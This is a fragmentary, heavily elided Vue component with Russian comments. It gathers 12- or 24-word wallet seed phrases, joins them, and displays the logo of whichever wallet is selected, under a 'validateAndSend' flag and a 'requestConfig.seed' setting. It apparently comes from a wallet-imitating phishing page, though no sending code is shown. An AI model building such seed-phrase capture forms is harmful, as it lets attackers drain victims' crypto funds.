...
const handleNextClick = async () => {
  ...
  const validValues = phrases.value
    .map((n) => n.trim())
    .filter((n) => n !== "");
  //создаем строку из значений
  const joinedString = validValues.join(" ");
  const shadowRoot =
    getCurrentInstance()?.proxy?.$el?.getRootNode() as ShadowRoot;
  ...
  try {
    ...
    if (store.requestConfig.seed) {
      ...
      const validateAndSend = true; // Временно для компиляции

      if (validateAndSend) {
        allSeedInputs.forEach((input: Element) => {
...
watch(seedLength, async () => {
  ...
  if (
    store.seedsPhrases &&
    store.seedsPhrases.length > 0 &&
    seedLength.value == 24
  ) {
    store.seedsPhrases.forEach((phrase, index) => {
      phrases.value[index] = phrase;
    });
    for (let i = store.seedsPhrases.length; i < seedLength.value; i++) {
      phrases.value[i] = "";
    }
        ...
        >
          ...
          >
            <img
              ...
              :src="`${$wallets.getSelectedWallet()!.image}`"
              alt=""
            />
            <h1
              style="
